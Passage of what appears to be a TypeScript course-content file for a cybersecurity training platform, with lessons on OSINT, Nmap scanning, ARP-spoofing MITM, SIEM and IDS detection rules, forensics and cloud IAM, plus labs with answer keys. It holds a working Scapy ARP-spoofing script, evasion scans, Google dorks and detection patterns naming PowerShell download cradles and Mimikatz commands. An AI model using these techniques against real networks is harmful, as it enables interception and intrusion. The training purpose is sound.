        'dkim': 'pass' if 'dkim=pass' in str(msg['Authentication-Results']) else 'fail'
    }
    
    # Red flags
    if analysis['from'] != analysis['return_path']:
        analysis['warning'] = 'From/Return-Path mismatch!'
    
    return analysis`,
          liveLab: {
            id: 'lab-phish-domain',
            title: 'Typosquat Detection',
            description: 'Identify malicious domain impersonation',
            difficulty: 'beginner',
            challenge: 'An employee received an email from "security@micros0ft-support.com" asking them to verify their password. Identify TWO red flags in this domain.',
            hint: 'Look at the spelling and the domain structure...',
            solution: '1. Zero instead of "o" (micros0ft), 2. Added "-support" subdomain',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('0') || lower.includes('zero') || lower.includes('typo') || lower.includes('spell')) ||
                     (lower.includes('subdomain') || lower.includes('support') || lower.includes('-'));
            },
            completed: false,
            points: 50,
            timeEstimate: '10 min',
            skills: ['Phishing detection', 'Domain analysis']
          }
        },
        {
          id: 'se-2',
          title: 'OSINT Techniques',
          completed: false,
          keyPoints: [
            'LinkedIn intelligence gathering',
            'Email harvesting',
            'Metadata extraction',
            'Social media profiling'
          ],
          content: `OPEN SOURCE INTELLIGENCE (OSINT)

Information gathering from public sources.

OSINT SOURCES:

1. SOCIAL MEDIA
   • LinkedIn (org structure, emails)
   • Twitter/X (opinions, technology)
   • Facebook (personal info)
   • GitHub (code, secrets)

2. COMPANY INFORMATION
   • Company website
   • Job postings (tech stack)
   • Press releases
   • SEC filings (public companies)

3. TECHNICAL RECON
   • DNS records (dig, nslookup)
   • WHOIS data
   • Certificate transparency logs
   • Shodan/Censys

4. DOCUMENT METADATA
   • Author names
   • Software versions
   • Internal paths
   • GPS coordinates (photos)

TOOLS:
• theHarvester: Email/domain gathering
• Maltego: Visual link analysis
• Shodan: Internet-connected devices
• Google Dorks: Advanced search
• ExifTool: Metadata extraction
• Recon-ng: Automated OSINT

GOOGLE DORKS:
site:target.com filetype:pdf
site:linkedin.com "target company"
"@target.com" email
intitle:"index of" password`,
          codeExample: `# theHarvester usage
theHarvester -d target.com -b all -l 500

# Shodan CLI
shodan search "org:Target Company"
shodan host 1.2.3.4

# Google Dorks for OSINT
# Find exposed documents
site:target.com filetype:pdf
site:target.com filetype:xlsx
site:target.com filetype:docx

# Find email addresses
"@target.com" -site:target.com

# Find subdomains
site:*.target.com

# Find exposed directories
intitle:"index of" site:target.com

# Metadata extraction with ExifTool
exiftool document.pdf
# Output includes:
# Author: John Smith
# Creator: Microsoft Word 2019
# Create Date: 2023:06:15

# Python OSINT automation
import requests
from bs4 import BeautifulSoup

def scrape_emails(url: str) -> list:
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    import re
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}'
    emails = re.findall(email_pattern, response.text)
    
    return list(set(emails))`,
          liveLab: {
            id: 'lab-osint',
            title: 'Google Dork Construction',
            description: 'Build effective search queries',
            difficulty: 'intermediate',
            challenge: 'Construct a Google search query to find PDF documents on example.com that contain the word "confidential".',
            hint: 'Use site: to limit domain and filetype: for PDF, plus your keyword...',
            solution: 'site:example.com filetype:pdf confidential',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('site:') && lower.includes('filetype:pdf') && lower.includes('confidential');
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['OSINT', 'Information gathering', 'Google dorking']
          }
        }
      ]
    },
    {
      id: 'network-attacks',
      title: 'Network Penetration',
      description: 'Network reconnaissance, exploitation, and lateral movement',
      icon: Wifi,
      color: 'text-blue-500',
      bgGradient: 'from-blue-500/20 to-cyan-500/20',
      completed: false,
      category: 'offensive',
      estimatedTime: '6 hours',
      prerequisites: ['network'],
      lessons: [
        {
          id: 'netattack-1',
          title: 'Network Reconnaissance',
          completed: false,
          keyPoints: [
            'Nmap scan techniques',
            'Service enumeration',
            'OS fingerprinting',
            'Vulnerability scanning'
          ],
          content: `NETWORK RECONNAISSANCE

SCANNING PHASES:

1. HOST DISCOVERY
   • Ping sweep
   • ARP scanning (local network)
   • TCP SYN to common ports

2. PORT SCANNING
   Types:
   • SYN scan (-sS): Stealthy, fast
   • Connect scan (-sT): Full connection
   • UDP scan (-sU): Slower, important
   • FIN/Xmas (-sF/-sX): Firewall evasion

3. SERVICE DETECTION
   • Version detection (-sV)
   • Script scanning (--script)
   • Banner grabbing

4. OS FINGERPRINTING
   • TCP/IP stack analysis
   • Response timing
   • Flag combinations

COMMON PORT TARGETS:
21  - FTP (file transfer)
22  - SSH (secure shell)
23  - Telnet (insecure)
25  - SMTP (email)
53  - DNS
80  - HTTP
443 - HTTPS
445 - SMB (file sharing)
3389 - RDP (remote desktop)
3306 - MySQL
5432 - PostgreSQL`,
          codeExample: `# Nmap Scanning Techniques

# Quick network sweep
nmap -sn 192.168.1.0/24

# SYN scan top 1000 ports
nmap -sS -T4 192.168.1.100

# Full port scan with version detection
nmap -sS -sV -p- 192.168.1.100

# Aggressive scan with OS detection
nmap -A -T4 192.168.1.100

# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB vulnerability check
nmap --script smb-vuln* -p 445 192.168.1.100

# Firewall evasion
nmap -sS -T2 -f --data-length 200 192.168.1.100

# Output to all formats
nmap -sV -oA scan_results 192.168.1.100

# Nmap output parsing with Python
import xml.etree.ElementTree as ET

def parse_nmap_xml(xml_file: str):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    hosts = []
    for host in root.findall('host'):
        ip = host.find('address').get('addr')
        ports = []
        
        for port in host.findall('.//port'):
            port_info = {
                'port': port.get('portid'),
                'protocol': port.get('protocol'),
                'state': port.find('state').get('state'),
                'service': port.find('service').get('name') if port.find('service') is not None else 'unknown'
            }
            ports.append(port_info)
        
        hosts.append({'ip': ip, 'ports': ports})
    
    return hosts`,
          liveLab: {
            id: 'lab-nmap',
            title: 'Nmap Command Builder',
            description: 'Construct effective scan commands',
            difficulty: 'intermediate',
            challenge: 'Write an Nmap command to: perform a SYN scan, detect service versions, scan all 65535 ports, and save results to XML format on target 10.10.10.5',
            hint: 'Use -sS for SYN, -sV for versions, -p- for all ports, -oX for XML...',
            solution: 'nmap -sS -sV -p- -oX output.xml 10.10.10.5',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('-ss') && lower.includes('-sv') && 
                     (lower.includes('-p-') || lower.includes('-p 1-65535')) &&
                     lower.includes('-ox');
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Network scanning', 'Nmap', 'Reconnaissance']
          }
        },
        {
          id: 'netattack-2',
          title: 'Man-in-the-Middle Attacks',
          completed: false,
          keyPoints: [
            'ARP spoofing',
            'DNS spoofing',
            'SSL stripping',
            'Traffic interception'
          ],
          content: `MAN-IN-THE-MIDDLE (MITM) ATTACKS

Position yourself between victim and destination to intercept/modify traffic.

ARP SPOOFING:
• Send fake ARP replies
• Associate your MAC with gateway IP
• All traffic routes through you

ATTACK FLOW:
┌────────┐    ┌──────────┐    ┌─────────┐
│ Victim │───►│ Attacker │───►│ Gateway │
└────────┘    └──────────┘    └─────────┘
     │              │              │
     └──────────────┴──────────────┘
              Normal route

DNS SPOOFING:
• Intercept DNS queries
• Return malicious IP addresses
• Redirect to phishing sites

SSL STRIPPING:
• Downgrade HTTPS to HTTP
• Victim sees HTTP site
• Attacker proxies to real HTTPS site

DEFENSES:
• Static ARP entries
• HTTPS everywhere
• HSTS (HTTP Strict Transport Security)
• Certificate pinning
• VPN usage
• 802.1X port security`,
          codeExample: `# ARP Spoofing with Scapy (Educational)
from scapy.all import *
import time

def get_mac(ip):
    """Get MAC address for IP via ARP request"""
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered = srp(arp_request, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def spoof(target_ip, spoof_ip, target_mac):
    """Send spoofed ARP reply"""
    # Tell target that spoof_ip is at our MAC
    packet = ARP(
        op=2,                    # ARP reply
        pdst=target_ip,          # Target IP
        hwdst=target_mac,        # Target MAC
        psrc=spoof_ip            # IP we're impersonating
    )
    send(packet, verbose=False)

def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restore original ARP tables"""
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )
    send(packet, count=4, verbose=False)

# Enable IP forwarding (Linux)
# echo 1 > /proc/sys/net/ipv4/ip_forward

# Detection: Monitor for ARP anomalies
def detect_arp_spoof(pkt):
    if ARP in pkt and pkt[ARP].op == 2:  # ARP reply
        real_mac = get_mac(pkt[ARP].psrc)
        response_mac = pkt[ARP].hwsrc
        if real_mac != response_mac:
            print(f"[!] ARP Spoofing detected! {pkt[ARP].psrc}")

sniff(filter="arp", prn=detect_arp_spoof)`
        }
      ]
    },
    // ============ DEFENSIVE SECURITY ============
    {
      id: 'detection',
      title: 'Threat Detection & Hunting',
      description: 'SIEM, behavioral analysis, and proactive threat hunting',
      icon: Radar,
      color: 'text-yellow-500',
      bgGradient: 'from-yellow-500/20 to-amber-500/20',
      completed: false,
      category: 'defensive',
      estimatedTime: '5 hours',
      lessons: [
        {
          id: 'detect-1',
          title: 'Behavioral Indicators (IOCs)',
          completed: false,
          keyPoints: [
            'File-based indicators',
            'Network-based indicators',
            'Process behavior patterns',
            'Registry artifacts'
          ],
          content: `INDICATORS OF COMPROMISE (IOCs)

CATEGORIES:

1. FILE-BASED
   • Hashes (MD5, SHA256)
   • File names/paths
   • File sizes
   • Magic bytes
   • YARA signatures

2. NETWORK-BASED
   • IP addresses
   • Domain names
   • URLs
   • JA3/JA3S fingerprints
   • User-agent strings

3. HOST-BASED
   • Registry modifications
   • Scheduled tasks
   • Service installations
   • Mutex names
   • Memory patterns

4. BEHAVIORAL
   • Rapid file encryption
   • Shadow copy deletion
   • Unusual process trees
   • Data exfiltration patterns

IOC LIFECYCLE:
Discovery → Analysis → Sharing → Aging → Retirement

SHARING STANDARDS:
• STIX/TAXII (structured)
• OpenIOC (Mandiant)
• MISP (threat intel platform)`,
          codeExample: `// IOC Detection Engine
interface IOC {
  type: 'hash' | 'ip' | 'domain' | 'file' | 'registry';
  value: string;
  confidence: number;
  tags: string[];
  source: string;
}

class IOCDetector {
  private iocs: IOC[] = [];
  
  loadIOCs(iocList: IOC[]) {
    this.iocs = iocList;
  }
  
  checkHash(hash: string): IOC | null {
    return this.iocs.find(ioc => 
      ioc.type === 'hash' && 
      ioc.value.toLowerCase() === hash.toLowerCase()
    ) || null;
  }
  
  checkIP(ip: string): IOC | null {
    return this.iocs.find(ioc => 
      ioc.type === 'ip' && 
      ioc.value === ip
    ) || null;
  }
  
  checkDomain(domain: string): IOC | null {
    return this.iocs.find(ioc => 
      ioc.type === 'domain' && 
      (domain === ioc.value || domain.endsWith('.' + ioc.value))
    ) || null;
  }
  
  analyzeProcess(process: {
    name: string;
    path: string;
    hash: string;
    parent: string;
    commandLine: string;
  }) {
    const alerts = [];
    
    // Check hash
    if (this.checkHash(process.hash)) {
      alerts.push({ type: 'MALWARE_HASH', severity: 'critical' });
    }
    
    // Suspicious parent-child relationships
    const suspiciousChains = [
      { parent: 'outlook.exe', child: 'powershell.exe' },
      { parent: 'excel.exe', child: 'cmd.exe' },
      { parent: 'word.exe', child: 'certutil.exe' }
    ];
    
    for (const chain of suspiciousChains) {
      if (process.parent.includes(chain.parent) && 
          process.name.includes(chain.child)) {
        alerts.push({ 
          type: 'SUSPICIOUS_PROCESS_CHAIN', 
          severity: 'high' 
        });
      }
    }
    
    return alerts;
  }
}`,
          liveLab: {
            id: 'lab-ioc-detection',
            title: 'IOC Prioritization',
            description: 'Evaluate IOC severity and response',
            difficulty: 'intermediate',
            challenge: 'You receive an alert: a hash matches known ransomware, but it\'s on a single workstation with no lateral movement. What\'s the FIRST action?',
            hint: 'Balance between evidence preservation and containment...',
            solution: 'Isolate/disconnect the workstation from network',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('isolat') || lower.includes('disconnect') || lower.includes('quarantine') || lower.includes('contain');
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Incident response', 'IOC analysis', 'Threat detection']
          }
        },
        {
          id: 'detect-2',
          title: 'SIEM & Log Analysis',
          completed: false,
          keyPoints: [
            'Log aggregation strategies',
            'Correlation rule development',
            'Alert tuning',
            'Threat hunting queries'
          ],
          content: `SIEM & LOG ANALYSIS

SECURITY INFORMATION & EVENT MANAGEMENT

KEY LOG SOURCES:
• Windows Event Logs
• Linux syslog/journald
• Firewall/IDS logs
• Proxy logs
• Application logs
• Cloud audit logs

CRITICAL WINDOWS EVENTS:
4624 - Successful logon
4625 - Failed logon
4648 - Explicit credentials
4672 - Special privileges assigned
4688 - Process creation
4697 - Service installed
4698 - Scheduled task created
4720 - User account created
1102 - Audit log cleared

CORRELATION EXAMPLES:
• Brute force: >5 failed logins + success
• Pass-the-hash: 4624 with NTLM + type 3
• Lateral movement: 4648 + network logon
• Persistence: 4697 or 4698 + new service

HUNTING QUERIES (Splunk/Elastic):
• Suspicious PowerShell
• Living-off-the-land binaries
• Unusual outbound connections
• Service account anomalies`,
          codeExample: `# Splunk Detection Queries

# Brute Force Detection
index=windows EventCode=4625 
| stats count by src_ip, user 
| where count > 5

# PowerShell Download Cradle
index=windows EventCode=4688 
| where CommandLine LIKE "%powershell%"
  AND (CommandLine LIKE "%WebClient%"
    OR CommandLine LIKE "%DownloadString%"
    OR CommandLine LIKE "%IEX%"
    OR CommandLine LIKE "%Invoke-Expression%")

# Mimikatz Detection
index=windows EventCode=4688
| where CommandLine LIKE "%sekurlsa%"
   OR CommandLine LIKE "%lsadump%"
   OR CommandLine LIKE "%kerberos::golden%"

# Lateral Movement via PsExec
index=windows EventCode=4697
| where ServiceName="PSEXESVC"

# Elastic/KQL Example
event.code: 4688 and 
process.command_line: (*powershell* and 
  (*downloadstring* or *webclient* or *iex*))

# Python: Parse Windows Event Logs
import Evtx.Evtx as evtx
import xml.etree.ElementTree as ET

def parse_security_log(evtx_file: str):
    with evtx.Evtx(evtx_file) as log:
        for record in log.records():
            xml_str = record.xml()
            root = ET.fromstring(xml_str)
            
            event_id = root.find('.//{http://schemas.microsoft.com/win/2004/08/events/event}EventID').text
            
            if event_id == '4625':  # Failed logon
                print(f"Failed logon detected at {record.timestamp()}")`,
          liveLab: {
            id: 'lab-siem',
            title: 'Write Detection Rule',
            description: 'Create a SIEM correlation rule',
            difficulty: 'advanced',
            challenge: 'Write a detection rule logic: Alert when a user has >10 failed logins (4625) followed by a successful login (4624) within 5 minutes from the same source IP.',
            hint: 'You need to correlate two event types with a time window and threshold...',
            solution: 'Count 4625 by src_ip where count>10, then join with 4624 where time_diff<5min and same src_ip',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('4625') || lower.includes('fail')) && 
                     (lower.includes('4624') || lower.includes('success')) &&
                     (lower.includes('time') || lower.includes('5') || lower.includes('minute') || lower.includes('window'));
            },
            completed: false,
            points: 100,
            timeEstimate: '25 min',
            skills: ['SIEM', 'Detection engineering', 'Log analysis']
          }
        },
        {
          id: 'detect-3',
          title: 'Threat Hunting Methodology',
          completed: false,
          keyPoints: [
            'Hypothesis-driven hunting',
            'MITRE ATT&CK framework',
            'Hunting playbooks',
            'TTP-based detection'
          ],
          content: `THREAT HUNTING

Proactive search for threats that evade automated detection.

HUNTING LOOP:
1. HYPOTHESIS
   "Attackers may be using PowerShell for C2"
   
2. DATA COLLECTION
   Gather relevant logs, artifacts

3. INVESTIGATION
   Query, analyze, correlate

4. FINDINGS
   Document discoveries

5. RESPONSE
   Create detections, remediate

MITRE ATT&CK FRAMEWORK:
Tactics (WHY):
• Initial Access
• Execution
• Persistence
• Privilege Escalation
• Defense Evasion
• Credential Access
• Discovery
• Lateral Movement
• Collection
• Exfiltration
• Impact

HUNTING HYPOTHESES BY TTP:
T1059 - Command Line Interface
  "Adversaries executing encoded PowerShell"
  
T1003 - Credential Dumping
  "LSASS access from non-system processes"
  
T1021 - Remote Services
  "Unusual RDP connections after hours"`,
          codeExample: `# Threat Hunting Playbook: Encoded PowerShell

# Hypothesis: Attackers use Base64 encoded commands to evade detection

# Step 1: Find encoded PowerShell execution
# Splunk Query
index=windows EventCode=4688 
| where CommandLine LIKE "%powershell%"
  AND (CommandLine LIKE "%-enc%" 
    OR CommandLine LIKE "%-encodedcommand%"
    OR CommandLine LIKE "%frombase64string%")
| table _time, ComputerName, User, CommandLine

# Step 2: Decode the Base64 payloads
import base64
import re

def decode_powershell(command: str) -> str:
    """Extract and decode Base64 PowerShell commands"""
    
    # Find base64 pattern after -enc or -encodedcommand
    patterns = [
        r'-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)',
        r'FromBase64String\(["\']([A-Za-z0-9+/=]+)["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, command, re.IGNORECASE)
        if match:
            try:
                encoded = match.group(1)
                # PowerShell uses UTF-16LE
                decoded = base64.b64decode(encoded).decode('utf-16le')
                return decoded
            except:
                pass
    
    return None

# Step 3: Analyze decoded commands
decoded = decode_powershell(command)
if decoded:
    indicators = []
    if 'downloadstring' in decoded.lower():
        indicators.append('DOWNLOAD')
    if 'invoke-expression' in decoded.lower():
        indicators.append('CODE_EXECUTION')
    if 'webclient' in decoded.lower():
        indicators.append('NETWORK')
    
    print(f"Decoded: {decoded}")
    print(f"Indicators: {indicators}")`
        }
      ]
    },
    {
      id: 'response',
      title: 'Incident Response',
      description: 'IR frameworks, evidence collection, and recovery procedures',
      icon: Siren,
      color: 'text-red-500',
      bgGradient: 'from-red-500/20 to-pink-500/20',
      completed: false,
      category: 'defensive',
      estimatedTime: '4 hours',
      lessons: [
        {
          id: 'response-1',
          title: 'NIST IR Framework',
          completed: false,
          keyPoints: [
            'Preparation phase essentials',
            'Detection & Analysis techniques',
            'Containment strategies',
            'Recovery and lessons learned'
          ],
          content: `NIST INCIDENT RESPONSE FRAMEWORK

1. PREPARATION (Before Incident)
   ✓ IR plan and playbooks
   ✓ Contact lists (legal, PR, vendors)
   ✓ Tools and jump kits ready
   ✓ Team training and exercises
   ✓ Baseline documentation
   ✓ Log aggregation configured

2. DETECTION & ANALYSIS
   • Alert triage and validation
   • Determine scope and impact
   • Identify attack vector
   • Timeline reconstruction
   • Evidence preservation
   
   Priority Levels:
   P1 - Critical: Active breach, data loss
   P2 - High: Malware, compromised system
   P3 - Medium: Policy violation, anomaly
   P4 - Low: Recon, informational

3. CONTAINMENT
   Short-term: Stop the bleeding
   • Isolate systems
   • Block IPs/domains
   • Disable accounts
   
   Long-term: Prevent recurrence
   • Patch vulnerabilities
   • Segment network
   • Reset credentials

4. ERADICATION
   • Remove malware
   • Close attack vector
   • Validate clean systems

5. RECOVERY
   • Restore from backup
   • Rebuild systems
   • Monitor closely

6. POST-INCIDENT
   • Root cause analysis
   • Update procedures
   • Share lessons learned`,
          liveLab: {
            id: 'lab-ir-phase',
            title: 'IR Phase Assignment',
            description: 'Match actions to correct IR phases',
            difficulty: 'beginner',
            challenge: 'The SOC has detected ransomware on 5 workstations. They immediately disconnected those machines from the network. Which NIST IR phase is this action?',
            hint: 'This action prevents the threat from spreading to other systems...',
            solution: 'Containment',
            validator: (input: string) => input.toLowerCase().includes('contain'),
            completed: false,
            points: 50,
            timeEstimate: '10 min',
            skills: ['Incident response', 'NIST framework']
          }
        },
        {
          id: 'response-2',
          title: 'Digital Forensics',
          completed: false,
          keyPoints: [
            'Order of volatility',
            'Memory forensics',
            'Disk imaging',
            'Chain of custody'
          ],
          content: `DIGITAL FORENSICS

ORDER OF VOLATILITY (Collect first):
1. CPU registers, cache
2. Memory (RAM)
3. Network state
4. Running processes
5. Disk (non-volatile)
6. Remote logging
7. Physical configuration
8. Archival media

MEMORY FORENSICS:
Tools: Volatility, Rekall

Artifacts:
• Running processes
• Network connections
• Loaded DLLs
• Registry hives
• Encryption keys
• Malware unpacked in memory

DISK FORENSICS:
• Create bit-for-bit image
• Calculate hash (integrity)
• Mount read-only
• Analyze file system
• Recover deleted files
• Timeline analysis

CHAIN OF CUSTODY:
Document:
• Who collected
• When collected
• How transported
• Where stored
• Who accessed`,
          codeExample: `# Memory Forensics with Volatility 3

# Identify OS profile
vol -f memory.raw windows.info

# List running processes
vol -f memory.raw windows.pslist
vol -f memory.raw windows.pstree

# Network connections
vol -f memory.raw windows.netscan

# Detect process injection
vol -f memory.raw windows.malfind

# Dump suspicious process
vol -f memory.raw windows.memmap --pid 1234 --dump

# Extract password hashes
vol -f memory.raw windows.hashdump

# Python: Memory Analysis Automation
import volatility3
from volatility3 import framework
from volatility3.framework import contexts, automagic

def analyze_memory(mem_file: str):
    """Automated memory analysis"""
    ctx = contexts.Context()
    single_location = "file:" + mem_file
    
    # Run plugins
    results = {
        'processes': run_plugin(ctx, 'windows.pslist.PsList'),
        'connections': run_plugin(ctx, 'windows.netscan.NetScan'),
        'malfind': run_plugin(ctx, 'windows.malfind.Malfind')
    }
    
    # Identify suspicious activity
    suspicious = []
    for proc in results['malfind']:
        suspicious.append({
            'pid': proc.PID,
            'process': proc.Process,
            'reason': 'Injected code detected'
        })
    
    return suspicious`,
          liveLab: {
            id: 'lab-forensics',
            title: 'Forensic Prioritization',
            description: 'Determine evidence collection order',
            difficulty: 'intermediate',
            challenge: 'You arrive at an incident scene with a running Windows workstation. List the FIRST three types of evidence you should collect (in order of volatility).',
            hint: 'Most volatile evidence is lost first when power is removed...',
            solution: '1. Memory/RAM, 2. Running processes/network connections, 3. Disk image',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('memory') || lower.includes('ram')) &&
                     (lower.includes('process') || lower.includes('network'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Digital forensics', 'Evidence collection']
          }
        }
      ]
    },
    {
      id: 'network-defense',
      title: 'Network Security',
      description: 'Firewalls, IDS/IPS, and network architecture security',
      icon: Shield,
      color: 'text-green-500',
      bgGradient: 'from-green-500/20 to-emerald-500/20',
      completed: false,
      category: 'defensive',
      estimatedTime: '4 hours',
      lessons: [
        {
          id: 'netdef-1',
          title: 'Network Segmentation',
          completed: false,
          keyPoints: [
            'VLAN implementation',
            'Zero Trust architecture',
            'Micro-segmentation',
            'DMZ design'
          ],
          content: `NETWORK SEGMENTATION

WHY SEGMENT?
• Limit lateral movement
• Reduce attack surface
• Regulatory compliance
• Performance optimization

SEGMENTATION STRATEGIES:

1. VLANs (Virtual LANs)
   • Layer 2 separation
   • Requires router for inter-VLAN
   • Easy to implement

2. FIREWALL ZONES
   • Trusted / Untrusted / DMZ
   • Stateful inspection
   • Policy enforcement

3. MICRO-SEGMENTATION
   • Host-level firewalls
   • Software-defined
   • Per-workload policies

ZERO TRUST PRINCIPLES:
• Never trust, always verify
• Least privilege access
• Assume breach
• Verify explicitly
• Use encryption everywhere

NETWORK ZONES:
┌─────────────────────────────────────┐
│              INTERNET               │
└──────────────────┬──────────────────┘
                   │
          ┌────────▼────────┐
          │    FIREWALL     │
          └────────┬────────┘
    ┌──────────────┼──────────────┐
    │              │              │
┌───▼───┐    ┌────▼────┐    ┌───▼───┐
│  DMZ  │    │ INTERNAL │   │ MGMT  │
│ (Web) │    │(Workstns)│   │(Admin)│
└───────┘    └──────────┘   └───────┘`,
          codeExample: `# Firewall Rules for Segmented Network
# Using iptables (Linux)

# Default deny all
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# DMZ to Internet (web servers)
iptables -A FORWARD -i dmz0 -o eth0 -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -i dmz0 -o eth0 -p tcp --dport 443 -j ACCEPT

# Internal to DMZ (access web apps)
iptables -A FORWARD -i internal0 -o dmz0 -p tcp --dport 443 -j ACCEPT

# Block SMB between segments (prevent lateral movement)
iptables -A FORWARD -p tcp --dport 445 -j DROP
iptables -A FORWARD -p tcp --dport 139 -j DROP

# Management access only from jump host
iptables -A INPUT -s 10.0.100.5 -p tcp --dport 22 -j ACCEPT

# Log dropped packets
iptables -A INPUT -j LOG --log-prefix "DROPPED: "
iptables -A FORWARD -j LOG --log-prefix "FORWARD-DROP: "

# Example: Zero Trust with network policies (Kubernetes)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-specific-ingress
spec:
  podSelector:
    matchLabels:
      app: web-server
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - port: 8080`
        },
        {
          id: 'netdef-2',
          title: 'IDS/IPS Implementation',
          completed: false,
          keyPoints: [
            'Snort/Suricata rules',
            'Signature vs anomaly detection',
            'False positive tuning',
            'Network sensor placement'
          ],
          content: `INTRUSION DETECTION & PREVENTION

IDS vs IPS:
• IDS: Detect and alert (passive)
• IPS: Detect and block (inline)

DETECTION METHODS:

1. SIGNATURE-BASED
   • Known attack patterns
   • Low false positives
   • Cannot detect unknown threats

2. ANOMALY-BASED
   • Baseline normal behavior
   • Detects unknown threats
   • Higher false positives

3. PROTOCOL ANALYSIS
   • Validate protocol compliance
   • Detect malformed packets

SENSOR PLACEMENT:
• Network perimeter
• Between segments
• At critical assets
• Span/tap ports

SNORT RULE ANATOMY:
action protocol src_ip src_port -> dst_ip dst_port (options)

Example:
alert tcp any any -> any 80 (
  msg:"SQL Injection Attempt";
  content:"UNION SELECT";
  nocase;
  sid:1000001;
)`,
          codeExample: `# Suricata Rules for Common Threats

# Ransomware C2 Communication
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"ET MALWARE Ransomware Checkin";
  flow:established,to_server;
  content:"POST";
  http_method;
  content:"/gate.php";
  http_uri;
  classtype:trojan-activity;
  sid:2024001;
  rev:1;
)

# SQL Injection Detection
alert http any any -> $HOME_NET any (
  msg:"SQL Injection - UNION SELECT";
  flow:established,to_server;
  http.uri;
  content:"union"; nocase;
  content:"select"; nocase; distance:0;
  classtype:web-application-attack;
  sid:2024002;
  rev:1;
)

# PowerShell Download Detection
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"PowerShell Download Cradle";
  flow:established,to_server;
  content:"powershell"; nocase;
  content:"downloadstring"; nocase;
  classtype:policy-violation;
  sid:2024003;
  rev:1;
)

# Detect TOR Traffic
alert tcp any any -> any any (
  msg:"TOR Network Traffic";
  flow:established;
  content:"|00 00 00 00 00|";
  depth:5;
  content:"|00 00 00|";
  within:3;
  classtype:policy-violation;
  sid:2024004;
  rev:1;
)

# Custom rule for specific threat
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Outbound to Known Bad IP";
  dst_addr: 192.0.2.1;  # Example IOC
  classtype:trojan-activity;
  sid:2024005;
  rev:1;
)`,
          liveLab: {
            id: 'lab-ids-rule',
            title: 'IDS Rule Creation',
            description: 'Write a detection rule',
            difficulty: 'advanced',
            challenge: 'Write a Snort/Suricata rule to detect HTTP requests containing "/admin/login" in the URI from any external IP to your web server (10.0.0.100).',
            hint: 'Use alert http, specify destination IP, and use http.uri content matching...',
            solution: 'alert http any any -> 10.0.0.100 any (content:"/admin/login"; http.uri;)',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('alert') && 
                     (lower.includes('http') || lower.includes('tcp')) &&
                     lower.includes('/admin/login');
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['IDS/IPS', 'Rule writing', 'Network security']
          }
        }
      ]
    },
    // ============ ADVANCED TOPICS ============
    {
      id: 'cloud-security',
      title: 'Cloud Security',
      description: 'AWS, Azure, GCP security, IAM, and cloud-native threats',
      icon: Cloud,
      color: 'text-sky-500',
      bgGradient: 'from-sky-500/20 to-blue-500/20',
      completed: false,
      category: 'advanced',
      estimatedTime: '5 hours',
      lessons: [
        {
          id: 'cloud-1',
          title: 'Cloud IAM Security',
          completed: false,
          keyPoints: [
            'Principle of least privilege',
            'Role-based access control',
            'Identity federation',
            'Service account hardening'
          ],
          content: `CLOUD IDENTITY & ACCESS MANAGEMENT

IAM CORE CONCEPTS:
• Identities: Users, groups, roles
• Policies: What actions are allowed
• Resources: What can be accessed

LEAST PRIVILEGE PRINCIPLES:
1. Grant minimum required permissions
2. Use time-limited credentials
3. Avoid wildcard permissions
4. Regular access reviews

AWS IAM STRUCTURE:
┌────────────────────────────────────┐
│           IAM Policy               │
├────────────────────────────────────┤
│ Effect: Allow/Deny                 │
│ Action: s3:GetObject               │
│ Resource: arn:aws:s3:::bucket/*    │
│ Condition: IpAddress, MFA, etc.    │
└────────────────────────────────────┘

COMMON MISCONFIGURATIONS:
❌ IAM policies with *:* (admin)
❌ Unused credentials not rotated
❌ Service accounts with user roles
❌ No MFA enforcement
❌ Cross-account access too permissive

BEST PRACTICES:
✓ Use roles instead of access keys
✓ Enable CloudTrail logging
✓ Implement MFA everywhere
✓ Use SCPs for guardrails
✓ Regular credential rotation`,
          codeExample: `// AWS IAM Policy - Secure Example
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowS3ReadSpecificBucket",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-secure-bucket",
        "arn:aws:s3:::my-secure-bucket/*"
      ],
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "10.0.0.0/8"
        },
        "Bool": {
          "aws:MultiFactorAuthPresent": "true"
        }
      }
    }
  ]
}

// Terraform: Secure IAM Role
resource "aws_iam_role" "lambda_role" {
  name = "secure-lambda-role"
  
  assume_role_policy = jsonencode({
